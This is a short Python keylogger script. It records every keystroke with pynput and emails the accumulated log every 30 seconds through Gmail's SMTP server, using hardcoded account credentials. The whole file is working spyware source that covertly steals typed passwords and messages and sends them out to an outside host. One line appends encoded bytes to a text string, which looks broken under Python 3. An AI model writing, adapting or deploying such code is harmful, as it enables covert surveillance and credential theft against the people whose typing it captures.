import pynput.keyboard   
import smtplib           
import threading         

log = ""

def callback(key):                      
    global log              
    try:
        log = log + key.char.encode("utf-8")   
        
    except AttributeError:
        if key == key.space: 
            log = log + " "
        else:
            log = log + str(key)

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)  
    email_server.starttls()                            
    email_server.login(email,password)                 
    email_server.sendmail(email,email,message)         
    email_server.quit()                               


def thread():          
    global log                  
    send_email("johnnysilverhand@gmail.com", "asdasd123456", log)
    log = ""          
    timer = threading.Timer(30,thread)
    timer.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback)        
with keylogger_listener:                                                        
    thread()         
    keylogger_listener.join() 
